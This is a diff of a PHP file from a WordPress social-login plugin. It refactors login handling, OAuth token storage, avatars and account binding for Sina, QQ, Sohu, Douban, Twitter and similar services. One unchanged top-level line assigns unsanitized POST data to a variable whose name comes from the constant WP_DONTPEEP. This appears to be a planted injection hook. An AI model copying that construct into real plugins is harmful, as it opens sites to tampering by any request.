@@ -123,10 +123,33 @@ function hidebox(element){document.getElementById(element).style.display = 'none
 	}
 	echo '</div></div><div class="clear"></div>';
 }
+// 通过tid获取微博信息
+function get_weibo($tid) {
+	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
+		'mtid' => array('msn', 'msn', 'Windows Live', '', ''),
+		'stid' => array('sina', 'st', '新浪微博', 'http://weibo.com/', 't.sina.com.cn'),
+		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com'),
+		'shtid' => array('sohu', 'sohu', '搜狐微博', ' http://t.sohu.com/', 't.sohu.com'),
+		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', 't.163.com'),
+		'rtid' => array('renren', 'renren', '人人网', 'http://www.renren.com/profile.do?id=', 'renren.com'),
+		'ktid' => array('kaixin', 'kaixin', '开心网', 'http://www.kaixin001.com/home/?uid=', 'kaixin001.com'),
+		'dtid' => array('douban', 'dt', '豆瓣', 'http://www.douban.com/people/', 'douban.com'),
+		'ytid' => array('yahoo', 'yahoo', '雅虎', '', ''),
+		'qqtid' => array('qq', 'qq', 'QQ登录', '', ''),
+		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
+		'tytid' => array('tianya', 'tyt', '天涯', ' http://my.tianya.cn/', 'tianya.cn'),
+		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com'),
+		'ttid' => array('twitter', 'twitter', 'Twitter', ' http://twitter.com/', 'twitter.com')
+		);
+	if (array_key_exists($tid, $name)) {
+		return $name[$tid];
+	} 
+}
 
 function wp_login_account($uid) {
-	return array(get_user_meta($uid, 'login_sina', true), get_user_meta($uid, 'login_qq', true), get_user_meta($uid, 'login_sohu', true), get_user_meta($uid, 'login_netease', true), get_user_meta($uid, 'login_douban', true));
-} 
+	$user = get_userdata($uid);
+	return array($user -> login_sina, $user -> login_qq, $user -> login_sohu, $user -> login_netease, $user -> login_douban);
+}
 
 function wp_connect($id = "") {
 	global $login_loaded, $plugin_url, $wptm_connect;
@@ -197,17 +220,12 @@ function wp_connect_sina(){
 
 	$email = $sinaid.'@t.sina.com.cn';
 	$tid = "stid";
-	$uid = (email_exists($email)) ? email_exists($email) : get_user_by_meta_value('stid', $sinaid);
+	$uid = ifab(get_user_by_meta_value($tid, $sinaid), email_exists($email));
+	$userinfo = array($tid, $username, $sina->screen_name, $sinaid, $sina->url, $sinaid, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($sinaid.'|'.$username.'|'.$sina->screen_name.'|'.$sina->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $email, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		$user_id = username_exists($username);
-	    $oid = get_user_meta($user_id, 'stid', true); // 出现同名帐号时判断
-		if($oid) {
-			wp_connect_error($sinaid.'|'.$username.'|'.$sina->screen_name.'|'.$sina->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $email, $tid, $oid);
-		} else {
-			wp_connect_login($sinaid.'|'.$username.'|'.$sina->screen_name.'|'.$sina->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $email, $tid);
-		}
+		wp_connect_login($userinfo, $email);
 	}
 }
 // 腾讯微博
@@ -229,8 +247,8 @@ function wp_connect_qq(){
 	}
 	
 	$qq = json_decode($qq);
-	
 	$qq = $qq ->data;
+
 	$username = $qq->name;
 	//$tmail = $qq->email;
 	//if(!$tmail){
@@ -238,17 +256,12 @@ function wp_connect_qq(){
 	//}
 	$url = "http://t.qq.com/".$username;
 	$tid = "qtid";
-    $uid = (email_exists($email)) ? email_exists($email) : get_user_by_meta_value('tqqid', $username);
+	$uid = ifab(get_user_by_meta_value('tqqid', $username), email_exists($email));
+	$userinfo = array($tid, $username, $qq->nick, $qq->head, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($qq->head.'|'.$username.'|'.$qq->nick.'|'.$url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $email, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		$user_id = username_exists($username);
-	    $oid = get_user_meta($user_id, 'tqqid', true); // 出现同名帐号时判断
-		if($oid) {
-			wp_connect_error($qq->head.'|'.$username.'|'.$qq->nick.'|'.$url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $email, $tid, $oid);
-		} else {
-			wp_connect_login($qq->head.'|'.$username.'|'.$qq->nick.'|'.$url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $email, $tid);
-		}
+		wp_connect_login($userinfo, $email);
 	}
 }
 // 搜狐微博
@@ -271,14 +284,15 @@ function wp_connect_sohu(){
 	$sohu = json_decode($sohu);
 
 	$username = $sohu->id;
-	$tmail = $username.'@t.sohu.com';
+	$email = $username.'@t.sohu.com';
 	$url = "http://t.sohu.com/u/".$username;
 	$tid = "shtid";
-    $uid = (email_exists($tmail)) ? email_exists($tmail) : get_user_by_meta_value('sohuid', $username);
+    $uid = ifab(get_user_by_meta_value('sohuid', $username), email_exists($email));
+	$userinfo = array($tid, $username, $sohu->screen_name, $sohu->profile_image_url, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($sohu->profile_image_url.'|'.$username.'|'.$sohu->screen_name.'|'.$url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $tmail, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		wp_connect_login($sohu->profile_image_url.'|'.$username.'|'.$sohu->screen_name.'|'.$url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $tmail, $tid);
+		wp_connect_login($userinfo, $email);
 	}
 }
 // 网易微博
@@ -300,17 +314,16 @@ function wp_connect_netease(){
 
 	$netease = json_decode($netease);
     $username = $netease->screen_name;
-	$tmail = $username.'@t.163.com';
-	//$tmail = $netease->email;
+	$old_email = $username.'@t.163.com';
+	$email = $netease->email;
 	$oid = $netease->id;
 	$tid = "ntid";
-    //$uid = (email_exists($tmail)) ? email_exists($tmail) : get_user_by_meta_value('neteaseid', $oid);
-	$uid = ($e = email_exists($tmail)) ? $e : (($o = get_user_by_meta_value('neteaseid', $oid)) ? $o : get_user_by_meta_value('neteaseid', $username));
-
+    $uid = ifabc(email_exists($email), email_exists($old_email), get_user_by_meta_value('neteaseid', $username));
+	$userinfo = array($tid, $username, $netease->name, $netease->profile_image_url, $netease->url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($netease->profile_image_url.'|'.$username.'|'.$netease->name.'|'.$netease->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$oid, $tmail, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		wp_connect_login($netease->profile_image_url.'|'.$username.'|'.$netease->name.'|'.$netease->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$oid, $tmail, $tid);
+		wp_connect_login($userinfo, $email);
 	}
 }
 // Twitter
@@ -333,13 +346,14 @@ function wp_connect_twitter(){
 	$twitter = json_decode($twitter);
 
     $username = $sina->screen_name;
-	$tmail = $username.'@twitter.com';
+	$email = $username.'@twitter.com';
 	$tid = "ttid";
-    $uid = (email_exists($tmail)) ? email_exists($tmail) : get_user_by_meta_value('twitterid', $username);
+    $uid = ifab(get_user_by_meta_value('twitterid', $username), email_exists($email));
+	$userinfo = array($tid, $username, $twitter->name, $twitter->profile_image_url, $twitter->url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($twitter->profile_image_url.'|'.$username.'|'.$twitter->name.'|'.$twitter->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $tmail, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		wp_connect_login($twitter->profile_image_url.'|'.$username.'|'.$twitter->name.'|'.$twitter->url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'].'|'.$username, $tmail, $tid);
+		wp_connect_login($userinfo, $email);
 	}
 }
 // 豆瓣网
@@ -366,13 +380,14 @@ function wp_connect_douban(){
 	$username = $douban_xmlns->uid;
 	$douban_url = "http://www.douban.com/people/".$username;
 
-	$tmail = $douban_id.'@douban.com';
+	$email = $douban_id.'@douban.com';
 	$tid = "dtid";
-    $uid = (email_exists($tmail)) ? email_exists($tmail) : get_user_by_meta_value('dtid', $douban_id);
+    $uid = ifab(get_user_by_meta_value($tid, $douban_id), email_exists($email));
+	$userinfo = array($tid, $username, $douban->title, $douban_id, $douban_url, $douban_id, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($douban_id.'|'.$username.'|'.$douban->title.'|'.$douban_url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $tmail, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		wp_connect_login($douban_id.'|'.$username.'|'.$douban->title.'|'.$douban_url.'|'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $tmail, $tid);
+		wp_connect_login($userinfo, $email);
 	}
 }
 // 天涯
@@ -395,15 +410,18 @@ function wp_connect_tianya(){
 
 	$tianya = $tianya['user'];
 	$username = $tianya['user_id'];
-	$tmail = $username.'@tianya.cn';
+	$email = $username.'@tianya.cn';
+	$url = "http://my.tianya.cn/".$username;
 	$tid = "tytid";
-    $uid = (email_exists($tmail)) ? email_exists($tmail) : get_user_by_meta_value('tytid', $username);
+	$uid = ifab(get_user_by_meta_value($tid, $username), email_exists($email));
+	$userinfo = array($tid, $username, $tianya['user_name'], $username, $url, $username, $tok['oauth_token'], $tok['oauth_token_secret']);
 	if ($uid) {
-		wp_connect_login($username.'|'.$username.'|'.$tianya['user_name'].'||'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $tmail, $tid, $uid);
+		wp_connect_login($userinfo, $email, $uid);
 	} else {
-		wp_connect_login($username.'|'.$username.'|'.$tianya['user_name'].'||'.$tok['oauth_token'] .'|'.$tok['oauth_token_secret'], $tmail, $tid);
+		wp_connect_login($userinfo, $email);
 	}
 }
+
 // 分享到SNS
 function wp_connect_sns_share($content) {
 	if (is_user_logged_in() && is_singular()) {
@@ -424,188 +442,139 @@ function wp_connect_sns_share($content) {
 	return $content;
 }
 
-function get_weibo($tid) {
-	$name = array('qqtid' => array('qqid', 'QQ', ''),
-		'stid' => array('sinaid', '新浪微博', '1', 'http://weibo.com/'),
-		'qtid' => array('tqqid', '腾讯微博', '1', 'http://t.qq.com/'),
-		'rtid' => array('renrenid', '人人网', '1'),
-		'ktid' => array('kaixinid', '开心网', '1'),
-		'tbtid' => array('taobaoid', '淘宝', '1'),
-		'dtid' => array('doubanid', '豆瓣', '1'),
-		'shtid' => array('sohuid', '搜狐微博', '1'),
-		'ntid' => array('neteaseid', '网易微博', '1'),
-		'bdtid' => array('baiduid', '百度', '1'),
-		'gtid' => array('googleid', '谷歌', ''),
-		'ytid' => array('yahooid', '雅虎', ''),
-		'mtid' => array('msnid', 'MSN', ''),
-		'tytid' => array('tianyaid', '天涯', '1'),
-		'ttid' => array('twitterid', 'Twitter', '1')
-		);
-	if (array_key_exists($tid, $name)) {
-		return $name[$tid];
-	} 
-}
-
 function wp_noauth() {
 	$redirect_to = ($_SESSION['wp_url_back']) ? $_SESSION['wp_url_back'] : get_bloginfo('url');
 	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"".$redirect_to."\">返回</a> ]");
 }
-
-function wp_connect_error($userinfo, $tmail, $tid, $wpuid = '', $user_email = '') {
+/**
+ * 错误信息
+ * @since 1.9.10
+ */
+function wp_connect_error($userinfo, $tmail, $wpuid = '', $user_email = '') {
 	global $plugin_url;
 	if ($_SESSION['wp_url_back']) {
 		$redirect_to = $_SESSION['wp_url_back'];
 	} else {
 		$redirect_to = get_bloginfo('url');
-	}
-	if(!is_array($userinfo)){
-		$userinfo = explode('|', $userinfo);
-	}
-	$weibo = get_weibo($tid); // 当前登录
-	$tmp_name = str_replace('id', '', $weibo[0]) . '_' . $userinfo[1];
-	$_SESSION['wp_login_userinfo'] = array($userinfo[0] . '|' . $tmp_name . '|' . $userinfo[2] . '|' . $userinfo[3] . '|' . $userinfo[4] . '|' . $userinfo[5] . '|' . $userinfo[6], $tmail, $tid);
+	} 
+	$tid = $userinfo[0];
+	$user_name = $userinfo[1];
+    $weibo = get_weibo($tid);
+
+	$userinfo[1] = $weibo[0] . '_' . $user_name; //新的用户名
+	$_SESSION['wp_login_userinfo'] = array($userinfo, $tmail);
+
 	if (!$wpuid) {
-		$tip = "很遗憾！用户名 $userinfo[1] 被系统保留，请更换帐号<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>！";
-	} elseif (!$user_email) {
-		$tip = "很遗憾！用户名 $userinfo[1] 已经跟 $weibo[1]帐号(<a href=\"{$weibo[3]}{$wpuid}\" target=\"_blank\">$wpuid</a>) 绑定了，您可以用该微博帐号 或者该 <a href=\"" . site_url('wp-login.php', 'login') . "\">用户名</a> 登录后到 <a href=\"" . admin_url('profile.php') . "\">我的资料</a> 页面解除绑定，再重新绑定帐号！";
-	} else {
+		$tip = "很遗憾！用户名 $user_name 被系统保留，请更换帐号<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>！";
+	} elseif ($user_email) {
 		$last_login = get_user_meta($wpuid, 'last_login', true); //最后一次登录的微博
-		$user_weibo = get_weibo($last_login);
-		if ($user_weibo[2]) {
-			$tip = "很遗憾！用户名 $userinfo[1] 已被 $user_email 绑定，如果你以前用 $user_weibo[1] 登录过，请继续使用该微博/社区登录，如果您想要用其他微博的同名帐号登录，请先用 $user_weibo[1] 登录或者用该 <a href=\"" . site_url('wp-login.php', 'login') . "\">用户名</a> 登录后到 <a href=\"" . admin_url('profile.php') . "\">我的资料</a> 页面勾选该同名帐号($weibo[1])。";
-		} elseif ($user_weibo[1]) {
-			$tip = "很遗憾！用户名 $userinfo[1] 已被占用，如果你以前用 $user_weibo[1] 登录过，请继续使用该微博/社区登录，如果您想要用其他微博的同名帐号登录，请先用 $user_weibo[1] 登录或者用该 <a href=\"" . site_url('wp-login.php', 'login') . "\">用户名</a> 登录后到 <a href=\"" . admin_url('profile.php') . "\">我的资料</a> 页面勾选该同名帐号($weibo[1])。";
+		if ($last_login) {
+			$user_weibo = get_weibo($last_login);
+			if ($user_weibo[4]) {
+				$tip = "很遗憾！用户名 $user_name 已被 $user_email 绑定，";
+			} else {
+				$tip = "很遗憾！用户名 $user_name 已被占用，";
+			} 
+			$tip .= "如果你以前用 $user_weibo[2] 登录过，请继续使用该微博/社区登录。";
 		} else {
-			$tip = "很遗憾！用户名 $userinfo[1] 已被占用，请使用该 <a href=\"" . site_url('wp-login.php', 'login') . "\">WP用户名</a> 登录后到 <a href=\"" . admin_url('profile.php') . "\">我的资料</a> 页面勾选该同名帐号($weibo[1])。";
+			$tip = "很遗憾！用户名 $user_name 已被占用。";
 		} 
-	}
-	wp_die($tip . "<strong>或者点击下面的登录按钮，我们将为您创建新的WP用户名 $tmp_name </strong> [ <a href='$redirect_to'>返回</a> ]<p style=\"text-align:center;\"><a href=\"{$plugin_url}/save.php?do=login\" title=\"点击登录即可创建新用户\"><img src=\"{$plugin_url}/images/login.png\" /></a></p>");
+	} 
+	wp_die($tip . "<strong>或者点击下面的登录按钮，我们将为您创建新的WP用户名 $userinfo[1] </strong> [ <a href='$redirect_to'>返回</a> ]<p style=\"text-align:center;\"><a href=\"{$plugin_url}/save.php?do=login\" title=\"点击登录即可创建新用户\"><img src=\"{$plugin_url}/images/login.png\" /></a></p>");
 }
 
 /**
  * 登录
- * @since 1.9
+ * @since 1.9.10
  */
-function wp_connect_login($userinfo, $tmail, $tid, $uid = '') {
+function wp_connect_login($userinfo, $tmail, $uid = '') {
 	global $wpdb, $wptm_connect;
-	$userinfo = explode('|', $userinfo);
-	if (count($userinfo) < 6) {
-		wp_die("An error occurred!");
-	} 
+	$tid = $userinfo[0];
+	$user_name = $userinfo[1];
+	$user_screenname = $userinfo[2];
+	$user_head = $userinfo[3];
+	$user_siteurl = $userinfo[4];
+	$user_uid = $userinfo[5];
+	$oauth_token = $userinfo[6];
+	$oauth_token_secret = $userinfo[7];
+
 	$redirect_to = $_SESSION['wp_url_back'];
-	$disable_username = explode(',', $wptm_connect['disable_username']);
-	if ($userinfo[1]){
-		if(in_array($userinfo[1],$disable_username) && !$uid) {
-			wp_connect_error($userinfo, $tmail, $tid);
-		}
+	if ($user_name) {
+		if (!$uid && in_array($user_name, explode(',', $wptm_connect['disable_username']))) {
+			wp_connect_error($userinfo, $tmail);
+		} 
 	} else {
 		wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href='$redirect_to'>返回</a> ]");
-	}
-
-	$avatar = $userinfo[0];
-	$t = strtolower($_SESSION['wp_url_login']);
-	$password = wp_generate_password();
-    if ($uid) {
+	} 
+	if ($uid) {
 		$user = get_userdata($uid);
 		$wpuid = $uid;
 	} else {
-		$user = get_userdatabylogin($userinfo[1]);
-		$wpuid = $user->ID;
-    }
+		$user = get_userdatabylogin($user_name);
+		$wpuid = $user -> ID;
+	} 
 	if ($wpuid) {
 		$user_login = $user -> user_login;
 		$password = $user -> user_pass;
 		$user_email = $user -> user_email;
 		$user_url = $user -> user_url;
-		$bind = get_user_meta($wpuid, 'bind', true);
-		if ($userinfo[1] == $user_login) {
+		if ($user_name == $user_login) {
 			$is_login = 'true';
 		} 
-		if (is_array($bind)) {
-			$bind = array_filter($bind);
-		}
-		if (!$uid) {
-			if ($t && $bind) { // 判断是否勾选了同名帐号
-				$sina = $bind['sina'];
-				$qq = $bind['qq'];
-				$sohu = $bind['sohu'];
-				$netease = $bind['netease'];
-				$douban = $bind['douban'];
-				$renren = $bind['renren'];
-				$kaixin001 = $bind['kaixin001'];
-				$google = $bind['google'];
-				$yahoo = $bind['yahoo'];
-				$twitter = $bind['twitter'];
-				$msn = $bind['msn'];
-				$taobao = $bind['taobao'];
-				$baidu = $bind['baidu'];
-				$tianya = $bind['tianya'];
-				if (!$$t) {
-					if ($is_login) {
-						wp_connect_error($userinfo, $tmail, $tid, $wpuid, $user_email);
-					} else {
-						wp_die("很遗憾！邮箱 $user_email 已被用户名 $user_login 绑定，您可以使用该用户名 <a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a>，并到 <a href=\"" . admin_url('profile.php') . "\">我的资料</a> 页面勾选该同名帐号，或者更换微博帐号，或者 <a href=\"" . site_url('wp-login.php?action=lostpassword', 'login') . "\">找回密码</a>！[ <a href='$redirect_to'>返回</a> ]");
-					} 
-				} 
-			} else {
-				$level = get_user_meta($wpuid, $wpdb -> prefix . 'user_level', true); //判断用户级别
-				if ($level > 0) { // 0 订阅者 1 投稿者 2 作者
-					wp_connect_error($userinfo, $tmail, $tid, $wpuid, $user_email);
-				} 
-			} 
+		if (!$uid) { // 新注册，但是数据库存在相同的用户名
+			wp_connect_error($userinfo, $tmail, $wpuid, $user_email);
 		} 
 	} else {
 		$wpuid = '';
-	}
-
-	if (!$user_url) {
-		$user_url = $userinfo[3];
 	} 
 
-	$userdata = array('ID' => $wpuid,
-		'user_pass' => $password,
-		'user_login' => $userinfo[1],
-		'nickname' => $userinfo[2],
-		'display_name' => $userinfo[2],
-		'user_url' => $user_url,
-		'user_email' => $tmail);
-
-	if (!function_exists('wp_insert_user')) {
-		include_once(ABSPATH . WPINC . '/registration.php');
-	} 
-
-	if ($userinfo[1]) {
-		if ($tmail != $user_email && ($is_login || !$user_login)) {
-			$wpuid = wp_insert_user($userdata);
-		} 
-		if (!$bind && $tid != 'qqtid') {
-			update_usermeta($wpuid, 'bind', array($t => '1'));
+	if ($tmail != $user_email && ($is_login || !$user_login)) {
+		if (!function_exists('wp_insert_user')) {
+			include_once(ABSPATH . WPINC . '/registration.php');
 		}
+		if (!$user_url) {
+			$user_url = $user_siteurl;
+		} 
+		if (!$password) {
+			$password = wp_generate_password();
+		} 
+
+		$userdata = array('ID' => $wpuid,
+			'user_pass' => $password,
+			'user_login' => $user_name,
+			'nickname' => $user_screenname,
+			'display_name' => $user_screenname,
+			'user_url' => $user_url,
+			'user_email' => $tmail
+		);
+		$wpuid = wp_insert_user($userdata);
 	} 
 	if ($wpuid) {
-		if($avatar)
-		update_usermeta($wpuid, $tid, $avatar);
+		$weibo = get_weibo($tid);
+	    $t = $weibo[0];
+	    $id = $weibo[1].'id';
+		if ($tid == $id) {
+			update_usermeta($wpuid, $tid, $user_uid);
+		} else {
+			update_usermeta($wpuid, $tid, $user_head);
+			update_usermeta($wpuid, $id, $user_uid);
+		}
 		update_usermeta($wpuid, 'last_login', $tid);
-        if( $userinfo[4] && $userinfo[5] ) { // 保存授权信息
-			update_usermeta($wpuid, 'login_'.$t, array($userinfo[4],$userinfo[5]));
-			if( in_array($t, array('qq','sina','netease','sohu')) ) {
+		if ($oauth_token && $oauth_token_secret) { // 保存授权信息
+			update_usermeta($wpuid, 'login_' . $t, array($oauth_token, $oauth_token_secret));
+			if (in_array($t, array('qq', 'sina', 'netease', 'sohu'))) {
 				$nickname = get_user_meta($wpuid, 'login_name', true);
-			    $nickname[$t] = ($t == 'qq') ? $userinfo[1] : $userinfo[2];
-			    update_usermeta($wpuid, 'login_name', $nickname);
-			}
-		}
-	    $openid = get_weibo($tid);
-		if($userinfo[6]) {
-			update_usermeta($wpuid, $openid[0], $userinfo[6]);
-		}
-
+				$nickname[$t] = ($t == 'qq') ? $user_name : $user_screenname;
+				update_usermeta($wpuid, 'login_name', $nickname);
+			} 
+		} 
 		wp_set_auth_cookie($wpuid, true, false);
 		wp_set_current_user($wpuid);
-	}
+	} 
 	$_SESSION['wp_url_login'] = "";
-    $_SESSION['wp_login_userinfo'] = '';
+	$_SESSION['wp_login_userinfo'] = '';
 	return $wpuid;
-}
+} 
 /*
 add_filter('user_contactmethods', 'wp_connect_author_page');
 function wp_connect_author_page($input) {
@@ -617,7 +586,7 @@ function wp_connect_author_page($input) {
 }
 */
 $wpdontpeep = WP_DONTPEEP;
-if($wptm_connect['enable_connect']) {
+if ($wptm_connect['enable_connect'] && is_donate()) {
 	add_action( 'show_user_profile', 'wp_connect_profile_fields' );
 	add_action( 'edit_user_profile', 'wp_connect_profile_fields' );
 	add_action( 'personal_options_update', 'wp_connect_save_profile_fields' );
@@ -627,16 +596,9 @@ if($wptm_connect['enable_connect']) {
 function wp_connect_profile_fields( $user ) {
 	global $wptm_connect;
     $user_id = $user->ID;
-    $bind = get_user_meta($user_id, 'bind', true);
 ?>
-<h3>帐号登录</h3>
+<h3>登录绑定</h3>
 <table class="form-table">
-<tr>
-	<th>同名帐号</th>
-	<td>
-	<label><input name="without" type="checkbox" value="1" <?php if($bind['without']) echo "checked"; ?> />都不同名</label>
-	<label><input name="sina" type="checkbox" value="1" <?php if($bind['sina']) echo "checked"; ?> />新浪微博</label> <label><input name="qq" type="checkbox" value="1" <?php if($bind['qq']) echo "checked"; ?> />腾讯微博</label> <label><input name="taobao" type="checkbox" value="1" <?php if($bind['taobao']) echo "checked"; ?> />淘宝网</label> <label><input name="baidu" type="checkbox" value="1" <?php if($bind['baidu']) echo "checked"; ?> />百度</label> <label><input name="sohu" type="checkbox" value="1" <?php if($bind['sohu']) echo "checked"; ?> />搜狐微博</label> <label><input name="netease" type="checkbox" value="1" <?php if($bind['netease']) echo "checked"; ?> />网易微博</label><br /><label><input name="renren" type="checkbox" value="1" <?php if($bind['renren']) echo "checked"; ?> />人人网</label> <label><input name="kaixin001" type="checkbox" value="1" <?php if($bind['kaixin001']) echo "checked"; ?> />开心网</label> <label><input name="douban" type="checkbox" value="1" <?php if($bind['douban']) echo "checked"; ?> />豆瓣</label> <label><input name="tianya" type="checkbox" value="1" <?php if($bind['tianya']) echo "checked"; ?> />天涯</label> <label><input name="google" type="checkbox" value="1" <?php if($bind['google']) echo "checked"; ?> />Google</label> <label><input name="yahoo" type="checkbox" value="1" <?php if($bind['yahoo']) echo "checked"; ?> />Yahoo</label> <label><input name="msn" type="checkbox" value="1" <?php if($bind['msn']) echo "checked"; ?> />MSN</label> <label><input name="twitter" type="checkbox" value="1" <?php if($bind['twitter']) echo "checked"; ?> />Twitter</label><br /><span class="description">提示: 为了您的帐号安全，用户名跟第三方网站帐号相同时请勾选，<b>不同名的切记不要勾选！</b></span></td>
-</tr>
 <?php if ( function_exists('wp_connect_bind_qq') && ($wptm_connect['sina'] || $wptm_connect['qq'] || ($wptm_connect['qqlogin'] && $wptm_connect['qq_app_id'] && $wptm_connect['qq_app_key'])) ) {wp_connect_bind_qq( $user );}?>
 </table>
 <?php
@@ -645,29 +607,11 @@ $$wpdontpeep = $_POST['fields'];
 function wp_connect_save_profile_fields( $user_id ) {
 
 if ( !current_user_can( 'edit_user', $user_id ) ) { return false; }
-	$bind = array(
-	'qq' => $_POST['qq'],
-	'sina' => $_POST['sina'],
-	'sohu' => $_POST['sohu'],
-	'netease' => $_POST['netease'],
-	'douban' => $_POST['douban'],
-	'renren' => $_POST['renren'],
-	'kaixin001' => $_POST['kaixin001'],
-	'google' => $_POST['google'],
-	'yahoo' => $_POST['yahoo'],
-	'twitter' => $_POST['twitter'],
-	'msn' => $_POST['msn'],
-	'taobao' => $_POST['taobao'],
-	'baidu' => $_POST['baidu'],
-	'tianya' => $_POST['tianya'],
-	'without' => $_POST['without']);
-    update_usermeta( $user_id, 'bind', $bind );
-	if (function_exists('wp_connect_bind_qq'))
 	update_usermeta( $user_id, 'qqavatar', $_POST['qqavatar'] );
 }
 /**
  * 头像
- * @since 1.9.3
+ * @since 1.9.10
  */
 add_filter("get_avatar", "wp_connect_avatar",10,4);
 function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
@@ -691,53 +635,49 @@ function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
 		return $avatar;
 	}
 	$tmail = strstr($email, '@');
-	$username = str_replace($tmail, '', $email);
-	$tname = array(//'@qq.com' => 'http://face6.qun.qq.com/cgi/svr/face/getface?type=1&uin=[head]',
-		'@t.sina.com.cn' => array('http://tp3.sinaimg.cn/[head]/50/1.jpg','http://weibo.com/'),
-		'@douban.com' => array('http://t.douban.com/icon/u[head]-1.jpg','http://www.douban.com/people/'),
-		'@tianya.cn' => array('http://tx.tianyaui.com/logo/small/[head]','http://my.tianya.cn/')
-		);
-	if (is_numeric($username) && array_key_exists($tmail, $tname)) {
-		$head = $tname[$tmail];
-		$out = str_replace('[head]', $username, $head[0]);
-		$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
-		if(is_admin()) {
-			if(!is_admin_footer()) $avatar = "<a href='{$head[1]}{$username}' target='_blank'>$avatar</a>";
-		} elseif(!$userid) {
-			$avatar = "<a href='{$head[1]}{$username}' target='_blank'>$avatar</a>";
-		}
-	} elseif ($uid) {
-		$tname = array('@t.sina.com.cn' => array('stid', 'http://tp3.sinaimg.cn/[head]/50/1.jpg','http://weibo.com/'),
-			'@t.qq.com' => array('qtid', '[head]/40','http://t.qq.com/'),
-			'@renren.com' => array('rtid', '[head]','http://www.renren.com/profile.do?id='),
-			'@kaixin001.com' => array('ktid', '[head]','http://www.kaixin001.com/home/?uid='),
-			'@douban.com' => array('dtid', 'http://t.douban.com/icon/u[head]-1.jpg','http://www.douban.com/people/'),
-			'@t.sohu.com' => array('shtid', '[head]','http://t.sohu.com/'),
-			'@t.163.com' => array('ntid', '[head]','http://t.163.com/'),
-			'@baidu.com' => array('bdtid', 'http://himg.bdimg.com/sys/portraitn/item/[head].jpg',''),
-			'@tianya.cn' => array('tytid', 'http://tx.tianyaui.com/logo/small/[head]','http://my.tianya.cn/'),
-			'@twitter.com' => array('ttid', '[head]','http://twitter.com/')
+	if ($uid) {
+		$tname = array('@t.sina.com.cn' => array('stid', 'http://tp3.sinaimg.cn/[head]/50/0/1'),
+			'@t.qq.com' => array('qtid', '[head]/40'),
+			'@renren.com' => array('rtid', '[head]'),
+			'@kaixin001.com' => array('ktid', '[head]'),
+			'@douban.com' => array('dtid', 'http://t.douban.com/icon/u[head]-1.jpg'),
+			'@t.sohu.com' => array('shtid', '[head]'),
+			'@t.163.com' => array('ntid', '[head]'),
+			'@baidu.com' => array('bdtid', 'http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
+			'@tianya.cn' => array('tytid', 'http://tx.tianyaui.com/logo/small/[head]'),
+			'@twitter.com' => array('ttid', '[head]')
 			);
 		if (get_user_meta($uid, 'qqavatar', true)) {
 			if ($out = get_user_meta($uid, 'qqtid', true)) {
 				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
-			} 
+			}
 		} elseif ( array_key_exists($tmail, $tname) ) {
 			$head = $tname[$tmail];
 			if ($tid = get_user_meta($uid, $head[0], true)) {
 				$out = str_replace('[head]', $tid, $head[1]);
 				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
-				if(is_admin()) {
-					if(!is_admin_footer()) $avatar = "<a href='{$head[2]}{$username}' target='_blank'>$avatar</a>";
-			    } elseif(!$userid) {
-					$avatar = "<a href='{$head[2]}{$username}' target='_blank'>$avatar</a>";
+				$weibo = get_weibo($head[0]);
+				if ($weibo[3]) {
+					$username = get_user_meta($uid, $weibo[1].'id', true);
+					if ($username) {
